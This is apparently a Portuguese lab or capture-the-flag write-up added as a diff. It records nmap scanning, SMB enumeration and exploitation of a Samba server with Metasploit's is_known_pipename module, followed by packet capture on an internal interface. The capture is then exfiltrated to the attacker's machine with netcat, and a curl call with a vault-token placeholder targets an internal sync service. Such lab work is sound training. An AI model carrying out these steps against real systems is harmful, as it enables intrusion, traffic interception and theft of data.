@@ -1,0 +1,188 @@
+# Anotações — Laboratório de Segurança Digital
+
+### 1. Reconhecimento — Nmap
+
+Identifiquei o servidor e a versão do Samba:
+
+```bash
+nmap -sV -Pn -p 11753 10.104.16.6
+```
+
+Resultado:
+- IP: `10.104.16.6`
+- Porta: `11753`
+- Serviço: Samba
+- Versão: `4.5.8`
+
+### 2. Enumeração SMB
+
+Listei os compartilhamentos disponíveis:
+
+```bash
+smbclient -L //10.104.16.6 -p 11753 -N
+```
+
+Encontrei o compartilhamento `publico`.
+
+Entrei nele:
+
+```bash
+smbclient //10.104.16.6/publico -p 11753 -N
+```
+
+Dentro do compartilhamento, listei os arquivos:
+
+```bash
+ls
+```
+
+Encontrei `leia-me_TI.txt` e baixei o arquivo:
+
+```bash
+get leia-me_TI.txt
+exit
+```
+
+Li o conteúdo:
+
+```bash
+cat leia-me_TI.txt
+```
+
+O arquivo informava que o script de sincronização com o cofre interno já estava em execução.
+
+### 3. Exploração — Metasploit
+
+Iniciei o Metasploit:
+
+```bash
+msfconsole
+```
+
+Utilizei o módulo:
+
+```bash
+use exploit/linux/samba/is_known_pipename
+```
+
+Configurei o alvo:
+
+```bash
+set RHOSTS 10.104.16.6
+set RPORT 11753
+set SMB_SHARE_NAME publico
+```
+
+Executei:
+
+```bash
+run
+```
+
+Verifiquei as sessões e entrei na sessão 7:
+
+```bash
+sessions -l
+sessions -i 7
+```
+
+### 4. Investigação do servidor
+
+Executei os comandos:
+
+```bash
+whoami
+id
+ls -la /
+find / -iname "*flag*" 2>/dev/null
+```
+
+Encontrei a primeira flag:
+
+```text
+FLAG{1_samba_dmz_gabriel-germano-leonardo_c9a3a11be9}
+```
+
+Também analisei a rede:
+
+```bash
+ip a
+ip route
+env
+ls -la /
+```
+
+Interfaces identificadas:
+- eth0: `10.205.18.10/24`
+- eth1: `10.41.160.10/24`
+
+Encontrei e consultei o script:
+
+```bash
+cat /entrypoint.sh
+```
+
+O arquivo mostrou a comunicação automática com o cofre interno pela porta `5000`, no endereço `/sync`.
+
+### 5. Captura de pacotes — TCPDump
+
+Na sessão 7, iniciei a captura pela interface interna:
+
+```bash
+sudo tcpdump -i eth1 -w captura.pcap
+```
+
+Interrompi com `Ctrl + C`.
+
+Verifiquei o arquivo:
+
+```bash
+pwd
+ls -lh captura.pcap
+```
+
+Localização: `/tmp/captura.pcap`.
+
+### 6. Preparação para transferência e Wireshark
+
+No Kali, consultei o endereço IP:
+
+```bash
+ip -br a
+```
+
+IP do Kali: `10.104.16.17`.
+
+Verifiquei o Netcat:
+
+```bash
+which nc
+```
+
+Resultado: `/usr/bin/nc`.
+
+Comandos preparados para transferir a captura:
+
+**No Kali:**
+
+```bash
+nc -lvnp 9001 > captura.pcap
+```
+
+**Na sessão 7:**
+
+```bash
+nc 10.104.16.17 9001 < /tmp/captura.pcap
+```
+
+No Wireshark, os filtros utilizados para localizar a comunicação são:
+
+```text
+tcp.port == 5000
+```
+
+```text
+http.request
+```
+
+curl -H "X-Vault-Token: <SUA_CHAVE>" http://127.0.0.1:<PORTA_LOCAL>/sync
